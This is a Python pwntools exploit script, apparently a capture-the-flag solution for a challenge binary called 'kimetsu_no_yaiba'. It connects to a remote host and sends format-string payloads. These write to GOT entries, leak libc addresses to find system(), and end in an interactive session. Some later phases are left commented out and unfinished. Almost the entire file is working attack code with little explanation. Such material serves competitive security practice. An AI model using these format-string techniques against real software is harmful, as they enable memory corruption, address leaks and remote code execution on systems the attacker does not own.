# -*- coding: utf-8 -*-
from pwn import *

DEBUG = False

if DEBUG:
    r = process("./kimetsu_no_yaiba")
    gdb.attach(r)
    txt_warmup = "Ta đánh chưa nghiêm túc thôi"
    txt_fight = "chiến:"
    txt_congrats = "Chúc"
    stack2 = 50
    stack2_1 = 40
    sml = 231
    system_off = 0x000000000004f550
    start_off = 0x0000000000021b10
else:
    r = remote("125.235.240.166", 33333)
    txt_warmup = "I'm just warming up"
    txt_fight = "fight:"
    txt_congrats = "Cong"
    stack2 = 52
    stack2_1 = 42
    sml = 243
    system_off = 0x000000000055410
    start_off = 0x000000000026fc0


main = 0x400F44
exit_plt = 0x400870
exit_got = 0x602080
puts_got = 0x602020
printf_got = 0x602048
read_name = 0x0000000000400AF5
max_dame = 286331153
check_win = 0x000000000400BD5

# 10 11 payload
# 12 hp
# 13 strength (first 4bytes)
# 13 defend (4 bytes after)
# leak_stack 20
# stack_dest_addr 50

# Phase 1
print(r.recvuntil(txt_fight))
# write exit_got to stack
payload = "%6299776p%20$ln"
# payload = "%52$p"
r.sendline(payload)
while True:
    r.sendline("2")
    r.sendline(str(max_dame))
    r.recvuntil("Boss: \"")
    boss_msg = r.recvuntil("\"")[:-1]
    print(boss_msg)
    if boss_msg != txt_warmup:
        break
print(r.recvuntil("/n)"))
r.sendline("y")


print(r.recvuntil(txt_fight))
payload = "%3908p%" + str(stack2) + "$hn"
r.sendline(payload)
while True:
    r.sendline("2")
    r.sendline(str(max_dame))
    r.recvuntil("Boss: \"")
    boss_msg = r.recvuntil("\"")[:-1]
    print(boss_msg)
    if boss_msg != txt_warmup:
        break
print(r.recvuntil("/n)"))
r.sendline("n")

print(r.recvuntil(">"))
while True:
    r.sendline("2")
    r.sendline(str(max_dame))
    r.recvuntil("Boss: \"")
    boss_msg = r.recvuntil("\"")[:-1]
    print(boss_msg)
    if boss_msg != txt_warmup:
        break
print(r.recvuntil("/n)"))
r.sendline("n")

# Phase 2
print(r.recvuntil(txt_fight))
# # write exit_got to stack
# # leak _IO_puts+418, __libc_start_main+231
# # remote _libc_start_main+243

payload = "%17$p-%41$p"
# payload = "%52$p"
r.sendline(payload)
while True:
    r.sendline("2")
    r.sendline(str(max_dame))
    r.recvuntil("Boss: \"")
    boss_msg = r.recvuntil("\"")[:-1]
    print(boss_msg)
    if boss_msg != txt_warmup:
        break
print(r.recvuntil("WINNER: "))
startmainleak = r.recvuntil(txt_congrats)[-16:-4]
startmainleak = int(startmainleak, 16)
print(hex(startmainleak))
startmain = startmainleak - sml
print(hex(startmain))
base = startmain - start_off
print(hex(base))
system = base + system_off
ssys = hex(system)[-4:]
print(ssys)
ssys = int(ssys,16)

print(r.recvuntil("/n)"))
r.sendline("y")
print(r.recvuntil(txt_fight))
# 38 is old stack
# payload = "%"
payload = "%37$p%38$p%39$p"
r.sendline(payload)
while True:
    r.sendline("2")
    r.sendline(str(max_dame))
    r.recvuntil("Boss: \"")
    boss_msg = r.recvuntil("\"")[:-1]
    print(boss_msg)
    if boss_msg != txt_warmup:
        break

# print(r.recvuntil("/n)"))
# r.sendline("n")

# print(r.recvuntil(">"))
# while True:
#     r.sendline("2")
#     r.sendline(str(max_dame))
#     r.recvuntil("Boss: \"")
#     boss_msg = r.recvuntil("\"")[:-1]
#     print(boss_msg)
#     if boss_msg != txt_warmup:
#         break
# print(r.recvuntil("/n)"))
# r.sendline("n")

# Phase 3
# print(r.recvuntil(txt_fight))
# write exit_got to stack
# leak _IO_puts+418, __libc_start_main+231
# remote _libc_start_main+243

# payload = "%17$p-%41$p"
# # payload = "%52$p"
# r.sendline(payload)
# while True:
#     r.sendline("2")
#     r.sendline(str(max_dame))
#     r.recvuntil("Boss: \"")
#     boss_msg = r.recvuntil("\"")[:-1]
#     print(boss_msg)
#     if boss_msg != txt_warmup:
#         break


# print(r.recvuntil("/n)"))
# r.sendline("y")


# print(r.recvuntil(txt_fight))
# payload = "%" + str(stack2_1) + "$s"
# r.sendline(payload)
# while True:
#     r.sendline("2")
#     r.sendline(str(max_dame))
#     r.recvuntil("Boss: \"")
#     boss_msg = r.recvuntil("\"")[:-1]
#     print(boss_msg)
#     if boss_msg != txt_warmup:
#         break
# print(r.recvuntil("WINNER: "))
# leak = r.recvuntil("Chúc")[-12:-6]
# print(leak, len(leak))
# leak = u64(leak+"\x00\x00")
# print(hex(leak))

r.interactive()

# Final boss
# Name: Kibutsuji_Muzan
# Health: 2147483646
# Strength: 1000000
# Defend: 500000
# Skill: Kekkijutsu